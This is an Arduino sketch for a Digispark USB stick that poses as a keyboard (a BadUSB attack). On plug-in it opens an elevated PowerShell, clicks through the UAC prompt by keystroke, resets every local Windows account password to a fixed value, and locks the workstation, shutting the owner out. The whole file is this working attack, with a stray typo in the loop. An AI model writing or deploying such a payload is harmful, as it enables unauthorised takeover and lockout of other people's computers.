#include "DigiKeyboard.h"

void setup() {
    pinMode(1, OUTPUT);
    digitalWrite(1, HIGH); 
  delay(150);          
  digitalWrite(1, LOW);  
  delay(150);
  DigiKeyboard.delay(800);
      digitalWrite(1, HIGH); 


  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   digitalWrite(1, LOW); 
    DigiKeyboard.delay(20);
    digitalWrite(1, HIGH); 
    DigiKeyboard.delay(20); 
  DigiKeyboard.delay(600);


  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(300);


  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);

 digitalWrite(1, LOW); 
    DigiKeyboard.delay(20);
    digitalWrite(1, HIGH); 
    DigiKeyboard.delay(20); 


  DigiKeyboard.delay(1500);

  
   
    DigiKeyboard.sendKeyStroke(43); 
   DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(43); 
  DigiKeyboard.delay(100 );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);


 digitalWrite(1, LOW); 
    DigiKeyboard.delay(20);
    digitalWrite(1, HIGH); 
    DigiKeyboard.delay(20); 


DigiKeyboard.print("Get-LocalUser | ForEach-Object { net user $_.Name 852000 }");





    digitalWrite(1, LOW); 
    DigiKeyboard.delay(20);
    digitalWrite(1, HIGH); 
    DigiKeyboard.delay(20); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER);






    DigiKeyboard.print("rundll32.exe user32.dll,LockWorkStation");
    
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

     digitalWrite(1, LOW); 
    DigiKeyboard.delay(20);
    digitalWrite(1, HIGH); 
    DigiKeyboard.delay(20); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {
 digitalWrite(1, HIGH); 
  delay(250);          
  digitalWrite(1, LOW);  
  delay(250);sss


}
